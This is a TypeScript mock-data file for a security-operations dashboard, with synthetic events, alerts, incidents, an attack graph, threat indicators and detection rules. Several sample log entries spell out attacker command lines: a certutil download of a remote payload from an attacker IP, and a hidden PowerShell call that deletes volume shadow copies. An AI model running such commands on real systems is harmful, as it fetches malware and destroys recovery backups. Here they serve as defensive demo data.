import type { Severity } from "@/components/ui";
export type { Severity };

export interface SecurityEvent {
  id: string;
  timestamp: string;
  eventType: "AUTH_FAILURE" | "AUTH_SUCCESS" | "PROCESS_START" | "NET_CONN" | "DNS_QUERY" | "DATA_EXFIL" | "PRIV_ESC";
  severity: Severity;
  srcIp: string;
  dstIp: string;
  asset: string;
  user: string;
  message: string;
  dedupeHash: string;
  raw: Record<string, any>;
  isSynthetic: boolean;
}

export interface SecurityAlert {
  id: string;
  title: string;
  ruleName: string;
  mitreTechnique: string;
  mitreTactic: string;
  severity: Severity;
  confidence: number;
  riskScore: number;
  asset: string;
  user: string;
  timestamp: string;
  status: "open" | "acknowledged" | "investigating" | "resolved" | "suppressed";
  evidenceCount: number;
  incidentId?: string;
}

export interface Incident {
  id: string;
  title: string;
  severity: Severity;
  score: number;
  status: "new" | "triaged" | "contained" | "resolved";
  leadAnalyst: string;
  createdAt: string;
  updatedAt: string;
  tactics: string[];
  techniques: { id: string; name: string; observed: boolean }[];
  affectedAssets: string[];
  affectedUsers: string[];
  alertIds: string[];
  storyline: string;
  recommendedPlaybook: string;
}

export interface GraphNode {
  id: string;
  label: string;
  type: "attacker" | "perimeter" | "internal" | "database" | "cloud" | "identity";
  ip?: string;
  severity?: Severity;
  x: number;
  y: number;
  compromised: boolean;
  details: string;
}

export interface GraphEdge {
  id: string;
  source: string;
  target: string;
  label: string;
  type: "exploit" | "lateral" | "exfil" | "beacon" | "auth";
  animated?: boolean;
}

export interface MitreTechniqueItem {
  id: string;
  name: string;
  tactic: string;
  count: number;
  severity: Severity;
  observed: boolean;
}

export interface ThreatIndicator {
  id: string;
  type: "IP" | "DOMAIN" | "HASH_SHA256" | "URL";
  value: string;
  threatActor: string;
  confidence: number;
  tlp: "RED" | "AMBER" | "GREEN" | "WHITE";
  severity: Severity;
  sightings: number;
  firstSeen: string;
  lastSeen: string;
  tags: string[];
}

export interface EnterpriseAsset {
  id: string;
  hostname: string;
  type: "SERVER" | "WORKSTATION" | "DATABASE" | "NETWORK_DEVICE" | "CLOUD_RESOURCE";
  ipAddress: string;
  criticality: number;
  environment: "production" | "staging" | "dmz";
  owner: string;
  os: string;
  openAlerts: number;
  status: "compromised" | "warning" | "healthy";
  lastSeen: string;
}

export interface IdentityProfile {
  id: string;
  accountName: string;
  email: string;
  department: string;
  role: string;
  privileged: boolean;
  riskScore: number;
  failedLogins24h: number;
  lastLogin: string;
  status: "flagged" | "monitored" | "normal";
}

export interface DetectionRuleItem {
  id: string;
  name: string;
  mitreId: string;
  technique: string;
  type: "Threshold" | "Pattern Match" | "Heuristic" | "Unsupervised ML";
  severity: Severity;
  enabled: boolean;
  triggers24h: number;
  fidelityScore: number;
  description: string;
}

export interface ResponsePlaybook {
  id: string;
  name: string;
  description: string;
  category: "Containment" | "Eradication" | "Investigation" | "Notification";
  approvalRequired: boolean;
  automated: boolean;
  lastRun: string;
  successRate: number;
  executionsCount: number;
}

export interface CaseRecord {
  id: string;
  title: string;
  incidentId: string;
  priority: "P1 - Critical" | "P2 - High" | "P3 - Medium" | "P4 - Low";
  status: "Open" | "In Progress" | "Pending Review" | "Closed";
  assignee: string;
  openedAt: string;
  slaRemaining: string;
  notesCount: number;
}

export interface AuditRecord {
  id: number;
  timestamp: string;
  actor: string;
  role: string;
  action: string;
  target: string;
  ipAddress: string;
  status: "SUCCESS" | "DENIED" | "FAILURE";
}

// Generate base timeline hours
export const HOURLY_METRICS = [
  { hour: "00:00", events: 340, alerts: 1, threats: 0 },
  { hour: "02:00", events: 290, alerts: 0, threats: 0 },
  { hour: "04:00", events: 210, alerts: 2, threats: 1 },
  { hour: "06:00", events: 480, alerts: 3, threats: 1 },
  { hour: "08:00", events: 890, alerts: 5, threats: 2 },
  { hour: "10:00", events: 1420, alerts: 9, threats: 4 },
  { hour: "12:00", events: 1180, alerts: 6, threats: 2 },
  { hour: "14:00", events: 1560, alerts: 14, threats: 5 },
  { hour: "16:00", events: 1780, alerts: 18, threats: 6 },
  { hour: "18:00", events: 1340, alerts: 11, threats: 3 },
  { hour: "20:00", events: 920, alerts: 8, threats: 2 },
  { hour: "22:00", events: 580, alerts: 4, threats: 1 },
];

export const INITIAL_EVENTS: SecurityEvent[] = [
  {
    id: "EVT-8941",
    timestamp: "2026-10-22 19:35:12",
    eventType: "DATA_EXFIL",
    severity: "critical",
    srcIp: "10.0.4.15",
    dstIp: "185.220.101.5",
    asset: "db-core-02",
    user: "svc_backup",
    message: "Outbound encrypted transfer exceeding 8.4 GB to known external bulletproof IP",
    dedupeHash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    raw: { protocol: "TLSv1.3", bytes_out: 9018449102, dst_port: 8443, process: "curl.exe", user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" },
    isSynthetic: true,
  },
  {
    id: "EVT-8940",
    timestamp: "2026-10-22 19:34:02",
    eventType: "PROCESS_START",
    severity: "critical",
    srcIp: "10.0.4.15",
    dstIp: "10.0.4.15",
    asset: "db-core-02",
    user: "NT AUTHORITY\\SYSTEM",
    message: "vssadmin delete shadows /all /quiet executed via PowerShell invocation",
    dedupeHash: "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    raw: { command_line: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"vssadmin delete shadows /all /quiet\"", parent_process: "wmiprvse.exe", pid: 8204 },
    isSynthetic: true,
  },
  {
    id: "EVT-8939",
    timestamp: "2026-10-22 19:31:45",
    eventType: "PRIV_ESC",
    severity: "high",
    srcIp: "10.0.4.15",
    dstIp: "10.0.1.10",
    asset: "db-core-02",
    user: "svc_backup",
    message: "Token manipulation: SeDebugPrivilege enabled and lsass process memory accessed",
    dedupeHash: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
    raw: { target_process: "lsass.exe", granted_access: "0x1FFFFF", call_trace: "ntdll.dll!NtOpenProcessToken" },
    isSynthetic: true,
  },
  {
    id: "EVT-8938",
    timestamp: "2026-10-22 19:28:10",
    eventType: "NET_CONN",
    severity: "critical",
    srcIp: "10.0.2.80",
    dstIp: "198.51.100.44",
    asset: "web-gw-01",
    user: "www-data",
    message: "Periodic C2 beaconing detected to known Cobalt Strike Malleable C2 listener",
    dedupeHash: "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
    raw: { interval_s: 30, jitter_pct: 12, host: "updates-cdn-auth.com", uri: "/submit.php?id=9941", status: 200 },
    isSynthetic: true,
  },
  {
    id: "EVT-8937",
    timestamp: "2026-10-22 19:25:33",
    eventType: "AUTH_SUCCESS",
    severity: "high",
    srcIp: "194.26.29.112",
    dstIp: "10.0.1.5",
    asset: "vpn-edge",
    user: "alex.mercer",
    message: "Successful VPN authentication following 18 failed login attempts from abnormal ASN",
    dedupeHash: "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d",
    raw: { country: "NL", asn: "AS49981", mfa_status: "PUSH_ACCEPTED", user_agent: "OpenVPN-Client/2.5.8" },
    isSynthetic: true,
  },
  {
    id: "EVT-8936",
    timestamp: "2026-10-22 19:22:15",
    eventType: "AUTH_FAILURE",
    severity: "medium",
    srcIp: "194.26.29.112",
    dstIp: "10.0.1.5",
    asset: "vpn-edge",
    user: "alex.mercer",
    message: "Kerberos pre-authentication failure (KRB5KDC_ERR_PREAUTH_FAILED)",
    dedupeHash: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
    raw: { error_code: 24, failure_reason: "Bad password", attempts_in_window: 18 },
    isSynthetic: true,
  },
  {
    id: "EVT-8935",
    timestamp: "2026-10-22 19:18:40",
    eventType: "DNS_QUERY",
    severity: "high",
    srcIp: "10.0.3.45",
    dstIp: "10.0.0.2",
    asset: "ws-finance-08",
    user: "sarah.chen",
    message: "High volume TXT queries matching DNS tunneling protocol signatures",
    dedupeHash: "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
    raw: { query_type: "TXT", domain: "a99f182c.exfil.telecom-ns.org", total_queries_min: 420, bytes: 48920 },
    isSynthetic: true,
  },
  {
    id: "EVT-8934",
    timestamp: "2026-10-22 19:14:05",
    eventType: "NET_CONN",
    severity: "medium",
    srcIp: "103.152.18.22",
    dstIp: "10.0.1.1",
    asset: "fw-dmz-01",
    user: "anonymous",
    message: "TCP SYN port scan across 1,024 destination ports within 60 seconds",
    dedupeHash: "732f1caced390f102dede117645d37ebf7422f9417f71868d5b2073583176982",
    raw: { scanned_ports: "21,22,23,80,443,445,3389,8080", tcp_flags: "SYN", packet_count: 2048 },
    isSynthetic: true,
  },
  {
    id: "EVT-8933",
    timestamp: "2026-10-22 19:10:19",
    eventType: "PROCESS_START",
    severity: "high",
    srcIp: "10.0.2.80",
    dstIp: "10.0.2.80",
    asset: "web-gw-01",
    user: "www-data",
    message: "Execution of certutil to download remote staged executable",
    dedupeHash: "2c624232cdd221771294dfbb310aca000a0df6ec9b5feb9fedc74074a02ec37a",
    raw: { command_line: "certutil -urlcache -split -f http://198.51.100.44/payload.bin C:\\Windows\\Temp\\srvc.exe", pid: 4412 },
    isSynthetic: true,
  },
  {
    id: "EVT-8932",
    timestamp: "2026-10-22 19:05:42",
    eventType: "AUTH_FAILURE",
    severity: "low",
    srcIp: "10.0.3.11",
    dstIp: "10.0.1.10",
    asset: "ws-dev-04",
    user: "marcus.vance",
    message: "Single typo failure on local workstation login",
    dedupeHash: "11842e03534e3723deb2692231ff345d43b2fe344111fa624c7cdaf9c4244f17",
    raw: { client: "Kerberos", error: "Wrong Password", outcome: "Resolved_On_Retry" },
    isSynthetic: true,
  },
];

export const INITIAL_ALERTS: SecurityAlert[] = [
  {
    id: "ALT-1049",
    title: "Large Encrypted Data Exfiltration to Suspect External Host",
    ruleName: "Outbound Spike Threshold",
    mitreTechnique: "T1567.002",
    mitreTactic: "Exfiltration",
    severity: "critical",
    confidence: 98,
    riskScore: 95,
    asset: "db-core-02",
    user: "svc_backup",
    timestamp: "2026-10-22 19:35",
    status: "open",
    evidenceCount: 14,
    incidentId: "INC-001",
  },
  {
    id: "ALT-1048",
    title: "Volume Shadow Copy Deletion (Ransomware Inhibitor)",
    ruleName: "VSSAdmin Deletion Detection",
    mitreTechnique: "T1490",
    mitreTactic: "Impact",
    severity: "critical",
    confidence: 96,
    riskScore: 93,
    asset: "db-core-02",
    user: "NT AUTHORITY\\SYSTEM",
    timestamp: "2026-10-22 19:34",
    status: "investigating",
    evidenceCount: 8,
    incidentId: "INC-001",
  },
  {
    id: "ALT-1047",
    title: "Persistent C2 Beaconing Channel Established",
    ruleName: "Cobalt Strike Beacon Rhythm",
    mitreTechnique: "T1071.001",
    mitreTactic: "Command & Control",
    severity: "critical",
    confidence: 94,
    riskScore: 89,
    asset: "web-gw-01",
    user: "www-data",
    timestamp: "2026-10-22 19:28",
    status: "investigating",
    evidenceCount: 62,
    incidentId: "INC-002",
  },
  {
    id: "ALT-1046",
    title: "Credential Spraying Succeeded Against Admin Account",
    ruleName: "Brute Force / Password Spray",
    mitreTechnique: "T1110.003",
    mitreTactic: "Credential Access",
    severity: "high",
    confidence: 92,
    riskScore: 87,
    asset: "vpn-edge",
    user: "alex.mercer",
    timestamp: "2026-10-22 19:25",
    status: "acknowledged",
    evidenceCount: 22,
    incidentId: "INC-003",
  },
  {
    id: "ALT-1045",
    title: "High Frequency DNS Tunneling Detection",
    ruleName: "DNS Query Entropy & Length",
    mitreTechnique: "T1071.004",
    mitreTactic: "Exfiltration",
    severity: "high",
    confidence: 88,
    riskScore: 82,
    asset: "ws-finance-08",
    user: "sarah.chen",
    timestamp: "2026-10-22 19:18",
    status: "open",
    evidenceCount: 31,
    incidentId: "INC-005",
  },
  {
    id: "ALT-1044",
    title: "Reconnaissance Port Sweep on DMZ Subnet",
    ruleName: "Port Sweep Detector",
    mitreTechnique: "T1046",
    mitreTactic: "Discovery",
    severity: "high",
    confidence: 90,
    riskScore: 74,
    asset: "fw-dmz-01",
    user: "anonymous",
    timestamp: "2026-10-22 19:14",
    status: "open",
    evidenceCount: 18,
    incidentId: "INC-004",
  },
  {
    id: "ALT-1043",
    title: "Unsupervised Isolation Forest Baseline Anomaly",
    ruleName: "ML Behavioral Outlier v0.1",
    mitreTechnique: "T1036",
    mitreTactic: "Defense Evasion",
    severity: "medium",
    confidence: 76,
    riskScore: 54,
    asset: "ws-dev-08",
    user: "jordan.lee",
    timestamp: "2026-10-22 18:50",
    status: "acknowledged",
    evidenceCount: 5,
  },
  {
    id: "ALT-1042",
    title: "Suspicious Service Creation under Non-Standard Path",
    ruleName: "Windows Service Creation",
    mitreTechnique: "T1543.003",
    mitreTactic: "Persistence",
    severity: "medium",
    confidence: 84,
    riskScore: 61,
    asset: "ad-dc-01",
    user: "admin_sec",
    timestamp: "2026-10-22 18:22",
    status: "resolved",
    evidenceCount: 3,
  },
  {
    id: "ALT-1041",
    title: "Failed Root Login Over Internal SSH",
    ruleName: "Direct Root Login Prohibited",
    mitreTechnique: "T1078",
    mitreTactic: "Initial Access",
    severity: "low",
    confidence: 99,
    riskScore: 32,
    asset: "k8s-ingress-prod",
    user: "root",
    timestamp: "2026-10-22 17:40",
    status: "resolved",
    evidenceCount: 2,
  },
];

export const INITIAL_INCIDENTS: Incident[] = [
  {
    id: "INC-001",
    title: "Multi-stage intrusion: Initial Access → Credential Access → Exfiltration",
    severity: "critical",
    score: 95,
    status: "new",
    leadAnalyst: "Security Analyst (You)",
    createdAt: "2026-10-22 19:15:00",
    updatedAt: "2026-10-22 19:35:12",
    tactics: ["Initial Access", "Privilege Escalation", "Impact", "Exfiltration"],
    techniques: [
      { id: "T1110.001", name: "Brute Force", observed: true },
      { id: "T1068", name: "Exploitation for Privilege Escalation", observed: true },
      { id: "T1490", name: "Inhibit System Recovery (vssadmin)", observed: true },
      { id: "T1567.002", name: "Exfiltration to Cloud Storage", observed: true },
    ],
    affectedAssets: ["db-core-02", "vpn-edge", "ad-dc-01"],
    affectedUsers: ["svc_backup", "alex.mercer"],
    alertIds: ["ALT-1049", "ALT-1048", "ALT-1046"],
    storyline: "Attacker initiated password spray from NL exit node (194.26.29.112), compromising account alex.mercer. After obtaining VPN access, pivot to db-core-02 occurred. Adversary dumped lsass credentials, escalated to NT AUTHORITY\\SYSTEM, deleted volume shadow copies, and began staged exfiltration of sensitive telemetry.",
    recommendedPlaybook: "Isolate Endpoint & Revoke Credentials",
  },
  {
    id: "INC-002",
    title: "Cobalt Strike Command & Control on Public Web Gateway",
    severity: "critical",
    score: 93,
    status: "triaged",
    leadAnalyst: "David Miller (Tier 2)",
    createdAt: "2026-10-22 18:45:00",
    updatedAt: "2026-10-22 19:28:10",
    tactics: ["Initial Access", "Execution", "Command & Control"],
    techniques: [
      { id: "T1190", name: "Exploit Public-Facing Application", observed: true },
      { id: "T1059.001", name: "PowerShell Ingestion", observed: true },
      { id: "T1071.001", name: "Web Protocols Beaconing", observed: true },
    ],
    affectedAssets: ["web-gw-01"],
    affectedUsers: ["www-data"],
    alertIds: ["ALT-1047"],
    storyline: "Exploitation of web-gw-01 via public-facing CVE leading to shell spawn under www-data context. Download of staged payload through certutil and subsequent recurring beaconing to 198.51.100.44.",
    recommendedPlaybook: "Perimeter Firewall IP Block & Gateway Reimage",
  },
  {
    id: "INC-003",
    title: "Active Directory Reconnaissance & Spraying Attempt",
    severity: "high",
    score: 87,
    status: "contained",
    leadAnalyst: "Sarah Connor (SOC Lead)",
    createdAt: "2026-10-22 17:30:00",
    updatedAt: "2026-10-22 19:25:33",
    tactics: ["Credential Access", "Discovery"],
    techniques: [
      { id: "T1110.003", name: "Password Spraying", observed: true },
      { id: "T1087.002", name: "Account Discovery: Domain Account", observed: true },
    ],
    affectedAssets: ["vpn-edge", "ad-dc-01"],
    affectedUsers: ["alex.mercer", "svc_auth"],
    alertIds: ["ALT-1046"],
    storyline: "Distributed credential spray observed targeting 120 corporate directory accounts. Account alex.mercer was successfully unlocked after compromise. Account temporarily suspended and active sessions invalidated.",
    recommendedPlaybook: "Force Global Password Reset & MFA Token Refresh",
  },
  {
    id: "INC-004",
    title: "External Port Sweep & Vulnerability Probe",
    severity: "high",
    score: 74,
    status: "contained",
    leadAnalyst: "Automated Rule Engine",
    createdAt: "2026-10-22 19:10:00",
    updatedAt: "2026-10-22 19:14:05",
    tactics: ["Reconnaissance", "Discovery"],
    techniques: [
      { id: "T1046", name: "Network Service Discovery", observed: true },
    ],
    affectedAssets: ["fw-dmz-01"],
    affectedUsers: ["anonymous"],
    alertIds: ["ALT-1044"],
    storyline: "External IP 103.152.18.22 scanned perimeter edge ports for vulnerable services. Firewall ACL automatically blocked incoming traffic from this source CIDR.",
    recommendedPlaybook: "Edge Threat Intelligence Blocklist Sync",
  },
  {
    id: "INC-005",
    title: "Covert Data Exfiltration Over Recursive DNS",
    severity: "medium",
    score: 48,
    status: "new",
    leadAnalyst: "Security Analyst (You)",
    createdAt: "2026-10-22 19:18:00",
    updatedAt: "2026-10-22 19:20:00",
    tactics: ["Exfiltration", "Command & Control"],
    techniques: [
      { id: "T1071.004", name: "DNS Tunneling", observed: true },
    ],
    affectedAssets: ["ws-finance-08"],
    affectedUsers: ["sarah.chen"],
    alertIds: ["ALT-1045"],
    storyline: "Workstation ws-finance-08 generating high entropy TXT requests at rate of 7 req/sec. DNS sinkhole applied to domain exfil.telecom-ns.org.",
    recommendedPlaybook: "DNS Sinkhole Enforcement & Host Quarantine",
  },
];

export const GRAPH_NODES: GraphNode[] = [
  { id: "atk-1", label: "Attacker (194.26.29.112)", type: "attacker", ip: "194.26.29.112", severity: "critical", x: 60, y: 150, compromised: true, details: "Origin of credential spray and VPN compromise (AS49981 Netherlands)" },
  { id: "atk-2", label: "C2 Server (198.51.100.44)", type: "attacker", ip: "198.51.100.44", severity: "critical", x: 60, y: 340, compromised: true, details: "Cobalt Strike Malleable HTTP listener hosting payload.bin" },
  { id: "per-1", label: "VPN Gateway (vpn-edge)", type: "perimeter", ip: "10.0.1.5", severity: "high", x: 260, y: 150, compromised: true, details: "Compromised ingress point; account alex.mercer authenticated" },
  { id: "per-2", label: "Web Gateway (web-gw-01)", type: "perimeter", ip: "10.0.2.80", severity: "critical", x: 260, y: 340, compromised: true, details: "Exploited web server running C2 beaconing to external attacker" },
  { id: "usr-1", label: "Identity (alex.mercer)", type: "identity", severity: "high", x: 440, y: 80, compromised: true, details: "Domain account with administrative access to backup databases" },
  { id: "int-1", label: "Core Database (db-core-02)", type: "database", ip: "10.0.4.15", severity: "critical", x: 500, y: 220, compromised: true, details: "Target of privilege escalation, shadow copy destruction, and data staging" },
  { id: "int-2", label: "Domain Controller (ad-dc-01)", type: "internal", ip: "10.0.1.10", severity: "medium", x: 500, y: 380, compromised: false, details: "Active Directory root; Kerberos ticket requests observed" },
  { id: "cld-1", label: "Exfil Drop (185.220.101.5)", type: "cloud", ip: "185.220.101.5", severity: "critical", x: 740, y: 220, compromised: true, details: "Bulletproof storage receiving encrypted archives from db-core-02" },
];

export const GRAPH_EDGES: GraphEdge[] = [
  { id: "e1", source: "atk-1", target: "per-1", label: "Password Spray & VPN Login", type: "auth", animated: true },
  { id: "e2", source: "per-1", target: "usr-1", label: "Impersonates User", type: "auth" },
  { id: "e3", source: "usr-1", target: "int-1", label: "Lateral Movement (RDP/SSH)", type: "lateral", animated: true },
  { id: "e4", source: "atk-2", target: "per-2", label: "Payload Staging & Web Exploit", type: "exploit" },
  { id: "e5", source: "per-2", target: "atk-2", label: "Cobalt Strike Beacon (30s)", type: "beacon", animated: true },
  { id: "e6", source: "per-2", target: "int-1", label: "Internal Pivot Attempt", type: "lateral" },
  { id: "e7", source: "int-1", target: "int-2", label: "Kerberos TGT Request", type: "auth" },
  { id: "e8", source: "int-1", target: "cld-1", label: "Exfiltration (8.4 GB TLS)", type: "exfil", animated: true },
];

export const MITRE_TACTICS = [
  {
    name: "Initial Access",
    techniques: [
      { id: "T1190", name: "Exploit Public-Facing App", count: 4, severity: "critical" as Severity, observed: true },
      { id: "T1133", name: "External Remote Services", count: 2, severity: "high" as Severity, observed: true },
      { id: "T1566", name: "Phishing", count: 0, severity: "low" as Severity, observed: false },
    ],
  },
  {
    name: "Execution",
    techniques: [
      { id: "T1059.001", name: "PowerShell", count: 12, severity: "critical" as Severity, observed: true },
      { id: "T1059.003", name: "Windows Command Shell", count: 5, severity: "medium" as Severity, observed: true },
      { id: "T1204", name: "User Execution", count: 1, severity: "low" as Severity, observed: true },
    ],
  },
  {
    name: "Persistence",
    techniques: [
      { id: "T1543.003", name: "Windows Service", count: 3, severity: "medium" as Severity, observed: true },
      { id: "T1053", name: "Scheduled Task/Job", count: 1, severity: "low" as Severity, observed: true },
      { id: "T1098", name: "Account Manipulation", count: 0, severity: "low" as Severity, observed: false },
    ],
  },
  {
    name: "Privilege Escalation",
    techniques: [
      { id: "T1068", name: "Exploitation for Priv Esc", count: 2, severity: "critical" as Severity, observed: true },
      { id: "T1134", name: "Access Token Manipulation", count: 3, severity: "high" as Severity, observed: true },
    ],
  },
  {
    name: "Defense Evasion",
    techniques: [
      { id: "T1070", name: "Indicator Removal on Host", count: 4, severity: "high" as Severity, observed: true },
      { id: "T1036", name: "Masquerading", count: 2, severity: "medium" as Severity, observed: true },
      { id: "T1027", name: "Obfuscated Files", count: 6, severity: "high" as Severity, observed: true },
    ],
  },
  {
    name: "Credential Access",
    techniques: [
      { id: "T1110.001", name: "Brute Force", count: 8, severity: "high" as Severity, observed: true },
      { id: "T1110.003", name: "Password Spraying", count: 18, severity: "critical" as Severity, observed: true },
      { id: "T1003", name: "OS Credential Dumping", count: 2, severity: "critical" as Severity, observed: true },
    ],
  },
  {
    name: "Discovery",
    techniques: [
      { id: "T1046", name: "Network Service Discovery", count: 6, severity: "medium" as Severity, observed: true },
      { id: "T1087", name: "Account Discovery", count: 3, severity: "low" as Severity, observed: true },
    ],
  },
  {
    name: "Lateral Movement",
    techniques: [
      { id: "T1021.001", name: "Remote Desktop Protocol", count: 4, severity: "high" as Severity, observed: true },
      { id: "T1021.002", name: "SMB/Windows Admin Shares", count: 2, severity: "medium" as Severity, observed: true },
    ],
  },
  {
    name: "Command & Control",
    techniques: [
      { id: "T1071.001", name: "Web Protocols (HTTP/S)", count: 24, severity: "critical" as Severity, observed: true },
      { id: "T1071.004", name: "DNS C2 Protocol", count: 8, severity: "high" as Severity, observed: true },
    ],
  },
  {
    name: "Exfiltration",
    techniques: [
      { id: "T1567.002", name: "Exfiltration Over Web Service", count: 3, severity: "critical" as Severity, observed: true },
      { id: "T1048", name: "Alternative Protocol Exfil", count: 1, severity: "high" as Severity, observed: true },
    ],
  },
  {
    name: "Impact",
    techniques: [
      { id: "T1490", name: "Inhibit System Recovery", count: 2, severity: "critical" as Severity, observed: true },
      { id: "T1486", name: "Data Encrypted for Impact", count: 0, severity: "low" as Severity, observed: false },
    ],
  },
];

export const THREAT_INTEL_IOCS: ThreatIndicator[] = [
  { id: "IOC-101", type: "IP", value: "194.26.29.112", threatActor: "Midnight Blizzard (APT29)", confidence: 96, tlp: "RED", severity: "critical", sightings: 48, firstSeen: "2026-10-18", lastSeen: "2026-10-22", tags: ["VPN-BruteForce", "PasswordSpray", "Proxy"] },
  { id: "IOC-102", type: "IP", value: "198.51.100.44", threatActor: "Lazarus Group", confidence: 94, tlp: "AMBER", severity: "critical", sightings: 31, firstSeen: "2026-10-15", lastSeen: "2026-10-22", tags: ["CobaltStrike", "C2-Malleable", "Hosting"] },
  { id: "IOC-103", type: "IP", value: "185.220.101.5", threatActor: "LockBit Affiliates", confidence: 91, tlp: "RED", severity: "critical", sightings: 19, firstSeen: "2026-10-20", lastSeen: "2026-10-22", tags: ["Exfiltration", "Bulletproof", "TOR-Exit"] },
  { id: "IOC-104", type: "DOMAIN", value: "updates-cdn-auth.com", threatActor: "Lazarus Group", confidence: 89, tlp: "AMBER", severity: "high", sightings: 64, firstSeen: "2026-10-19", lastSeen: "2026-10-22", tags: ["DGA", "Typosquatting", "C2"] },
  { id: "IOC-105", type: "DOMAIN", value: "exfil.telecom-ns.org", threatActor: "FIN7", confidence: 87, tlp: "AMBER", severity: "high", sightings: 120, firstSeen: "2026-10-21", lastSeen: "2026-10-22", tags: ["DNS-Tunneling", "DataTheft"] },
  { id: "IOC-106", type: "HASH_SHA256", value: "3a918aef82b9049912cd31045dae7401123984ca981bbafc88123019aa910c22", threatActor: "Cobalt Strike Beacon", confidence: 99, tlp: "GREEN", severity: "critical", sightings: 12, firstSeen: "2026-10-14", lastSeen: "2026-10-22", tags: ["Beacon", "Loader", "Windows"] },
  { id: "IOC-107", type: "IP", value: "103.152.18.22", threatActor: "Generic Scanner / Shodan Botnet", confidence: 82, tlp: "WHITE", severity: "medium", sightings: 850, firstSeen: "2026-10-01", lastSeen: "2026-10-22", tags: ["Reconnaissance", "PortSweep"] },
];

export const ASSETS_LIST: EnterpriseAsset[] = [
  { id: "AST-01", hostname: "db-core-02", type: "DATABASE", ipAddress: "10.0.4.15", criticality: 5, environment: "production", owner: "Database Engineering", os: "PostgreSQL 16 / Ubuntu 22.04 LTS", openAlerts: 2, status: "compromised", lastSeen: "Just now" },
  { id: "AST-02", hostname: "web-gw-01", type: "SERVER", ipAddress: "10.0.2.80", criticality: 4, environment: "dmz", owner: "Web Ops", os: "nginx 1.25 / Debian 12", openAlerts: 1, status: "compromised", lastSeen: "Just now" },
  { id: "AST-03", hostname: "vpn-edge", type: "NETWORK_DEVICE", ipAddress: "10.0.1.5", criticality: 5, environment: "dmz", owner: "Network Sec", os: "Hardened Linux / OpenVPN 2.5", openAlerts: 1, status: "warning", lastSeen: "Just now" },
  { id: "AST-04", hostname: "ad-dc-01", type: "SERVER", ipAddress: "10.0.1.10", criticality: 5, environment: "production", owner: "IT Infrastructure", os: "Windows Server 2022 Datacenter", openAlerts: 1, status: "warning", lastSeen: "1 min ago" },
  { id: "AST-05", hostname: "ws-finance-08", type: "WORKSTATION", ipAddress: "10.0.3.45", criticality: 3, environment: "production", owner: "Sarah Chen (Finance VP)", os: "Windows 11 Pro 23H2", openAlerts: 1, status: "warning", lastSeen: "3 mins ago" },
  { id: "AST-06", hostname: "k8s-ingress-prod", type: "CLOUD_RESOURCE", ipAddress: "10.0.2.10", criticality: 4, environment: "production", owner: "DevOps Core", os: "Kubernetes v1.30 / Talos Linux", openAlerts: 1, status: "healthy", lastSeen: "Just now" },
  { id: "AST-07", hostname: "fw-dmz-01", type: "NETWORK_DEVICE", ipAddress: "10.0.1.1", criticality: 5, environment: "dmz", owner: "Network Sec", os: "PAN-OS 11.1", openAlerts: 1, status: "healthy", lastSeen: "Just now" },
  { id: "AST-08", hostname: "ws-dev-04", type: "WORKSTATION", ipAddress: "10.0.3.11", criticality: 2, environment: "staging", owner: "Marcus Vance", os: "macOS Sonoma 14.6", openAlerts: 0, status: "healthy", lastSeen: "5 mins ago" },
  { id: "AST-09", hostname: "s3-customer-archive", type: "CLOUD_RESOURCE", ipAddress: "10.0.8.20", criticality: 5, environment: "production", owner: "Cloud Platform", os: "AWS S3 Bucket (Encrypted)", openAlerts: 0, status: "healthy", lastSeen: "10 mins ago" },
];

export const IDENTITIES_LIST: IdentityProfile[] = [
  { id: "ID-01", accountName: "svc_backup", email: "svc_backup@internal.sentinelx.local", department: "Infrastructure", role: "Service Account", privileged: true, riskScore: 94, failedLogins24h: 3, lastLogin: "2026-10-22 19:35", status: "flagged" },
  { id: "ID-02", accountName: "alex.mercer", email: "alex.mercer@sentinelx-ai.com", department: "IT Administration", role: "Systems Administrator", privileged: true, riskScore: 88, failedLogins24h: 18, lastLogin: "2026-10-22 19:25", status: "flagged" },
  { id: "ID-03", accountName: "www-data", email: "www-data@web-gw-01.local", department: "Web Infrastructure", role: "Application Context", privileged: false, riskScore: 92, failedLogins24h: 0, lastLogin: "2026-10-22 19:28", status: "flagged" },
  { id: "ID-04", accountName: "sarah.chen", email: "sarah.chen@sentinelx-ai.com", department: "Finance", role: "VP of Finance", privileged: false, riskScore: 68, failedLogins24h: 1, lastLogin: "2026-10-22 19:18", status: "monitored" },
  { id: "ID-05", accountName: "admin_sec", email: "admin_sec@sentinelx-ai.com", department: "Security Operations", role: "SOC Administrator", privileged: true, riskScore: 15, failedLogins24h: 0, lastLogin: "2026-10-22 18:00", status: "normal" },
  { id: "ID-06", accountName: "marcus.vance", email: "marcus.vance@sentinelx-ai.com", department: "Engineering", role: "Senior Developer", privileged: false, riskScore: 22, failedLogins24h: 1, lastLogin: "2026-10-22 17:30", status: "normal" },
];

export const DETECTION_RULES: DetectionRuleItem[] = [
  { id: "RULE-01", name: "Outbound Data Exfiltration Spike", mitreId: "T1567.002", technique: "Exfiltration Over Web Service", type: "Threshold", severity: "critical", enabled: true, triggers24h: 3, fidelityScore: 98, description: "Triggers when outbound data transfers exceed 5 GB within a 15-minute sliding window to an unclassified external IP." },
  { id: "RULE-02", name: "Volume Shadow Copy Deletion", mitreId: "T1490", technique: "Inhibit System Recovery", type: "Pattern Match", severity: "critical", enabled: true, triggers24h: 2, fidelityScore: 99, description: "Detects invocations of vssadmin, wmic shadowcopy, or bcdedit tampering with backup recovery state." },
  { id: "RULE-03", name: "C2 Beaconing Periodic Cadence", mitreId: "T1071.001", technique: "Web Protocols", type: "Heuristic", severity: "critical", enabled: true, triggers24h: 14, fidelityScore: 95, description: "Statistical time-series analysis measuring low jitter interval connections across HTTP/S and TLS tunnels." },
